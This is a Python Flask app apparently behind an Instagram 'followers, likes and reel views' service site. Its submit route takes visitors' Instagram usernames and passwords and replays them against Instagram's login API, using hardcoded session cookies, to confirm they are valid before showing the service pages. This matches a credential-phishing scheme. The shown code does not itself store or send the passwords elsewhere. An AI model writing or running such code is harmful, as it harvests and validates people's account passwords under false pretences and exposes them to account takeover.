import time
from flask import Flask, redirect, request, render_template, url_for
from datetime import datetime
import requests
import json

app = Flask(__name__)

def IsExists(user, password):
    time = int(datetime.now().timestamp())
    url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"

    payload = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
        'optIntoOneTap': 'false',
        'queryParams': {},
        'username': user
    }
    files = []

    headers = {}

    response = requests.request("POST", url, headers=headers, data=payload, files=files)
    csrf = response.cookies["csrftoken"]
    if csrf is None:
        return {"status": "error", "message": "Unable to retrieve CSRF token"}
    
    headers = {
        'X-Csrftoken': f'{csrf}',
        'Cookie': f"csrftoken={csrf}; mid=ZIrEtgALAAE7GrCUwQ9wcQbbrefW; ig_did=80445D30-C9F9-4D3F-8BF0-78B39275775C; ig_nrcb=1; datr=tcSKZFMeDkyjVKNghYr_9-WI"
    }

    response = requests.request("POST", url, headers=headers, data=payload, files=files)
    try:
        json_response = response.json()
        return json_response
    except json.JSONDecodeError:
        return {"status": "error", "message": "Invalid JSON response"}

# return response.json()
# @app.route('/')
# def index():
#     return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    user = request.form['username']
    password = request.form['password']
    # time.sleep(2)
    x = IsExists(user, password)

    if x["status"] == "ok" and x["authenticated"] is not None and x["authenticated"] == True:
        return redirect(url_for('services'))
    else:
        alert_message = "Username or password is incorrect."
        alert_type = "danger"
        return render_template('index.html', alert_message=alert_message, alert_type=alert_type)
    
@app.route('/')
def index():
    alert_message = request.args.get('alert_message', None)
    alert_type = request.args.get('alert_type', None)
    return render_template('index.html', alert_message=alert_message, alert_type=alert_type)

# @app.route('/fail')
# def fail():
#     return render_template('fail.html')

@app.route('/followers')
def followers():
    return render_template('followers.html')

@app.route('/likes')
def likes():
    return render_template('likes.html')

@app.route('/reel_views')
def reel_views():
    return render_template('reel_views.html')

@app.route('/unavailable')
def unavailable():
    return render_template('unavailable.html')

@app.route('/services')
def services():
    return render_template('services.html')

@app.route('/terms')
def terms():
    return render_template('terms.html')

@app.route('/privacy')
def privacy():
    return render_template('privacy.html')

@app.route('/cookies')
def cookies():
    return render_template('cookies.html')

if __name__ == '__main__':
    app.run(debug=True)
